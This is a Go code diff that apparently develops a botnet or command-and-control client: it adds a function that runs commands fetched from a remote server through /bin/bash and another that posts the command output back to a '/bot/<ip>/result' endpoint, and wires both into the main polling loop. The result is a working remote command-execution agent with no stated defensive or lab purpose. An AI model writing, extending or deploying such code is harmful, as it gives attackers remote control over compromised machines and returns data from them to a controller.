@@ -14,6 +14,7 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"os/exec"
 	"os/user"
 	"strings"
 	"time"
@@ -135,13 +136,35 @@ func fetchCommand(registerkey string, ip string) string {
 	The function currently only supports simple_exec
 */
 
+func submitResult(registerkey string, ip string, result string) {
+	endpoint := URL + "/bot/" + ip + "/result"
+
+	var data = url.Values{
+		"registerkey": {registerkey},
+		"result":      {result}}
+
+	jsonData := simplePost(endpoint, data)
+	fmt.Println(jsonData)
+}
+
+/*
+Description: Executes commands that was fetched from the server.
+The commands are categorized as "upload", "download", "shell", and simple_exec.
+The function currently only supports simple_exec
+*/
+
 // TODO: Work on this function
-func executeCommand(command string) {
+func executeCommand(command string) string {
 	//argstr := []string("-c", command)
 	//out, err := exec.Command("/bin/bash", argstr).Output()
 	//if err != nil {
 	//	fmt.Println(err)
 	//}
+	out, err := exec.Command("/bin/bash", "-c", command).Output()
+	if err != nil {
+		return ""
+	}
+	return string(out)
 }
 
 func main() {
@@ -192,6 +215,9 @@ func main() {
 		if strings.Contains(command, "[-]") == true {
 			fmt.Println("[-] Sleeping... ")
 		}
+
+		execute_result := executeCommand(command)
+		fmt.Println("[+] Result: ", execute_result)
 
 		time.Sleep(10 * time.Second)
 
